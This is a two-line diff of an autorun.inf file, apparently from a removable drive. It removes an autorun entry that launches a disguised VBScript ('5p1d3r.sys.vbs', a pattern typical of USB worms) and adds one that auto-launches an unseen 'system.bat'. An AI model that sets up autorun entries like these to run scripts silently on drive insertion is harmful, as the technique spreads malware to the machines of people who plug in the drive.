@@ -1,2 +1,2 @@
 [autorun]
-shellexecute=wscript.exe 5p1d3r.sys.vbs
+shellexecute=system.bat
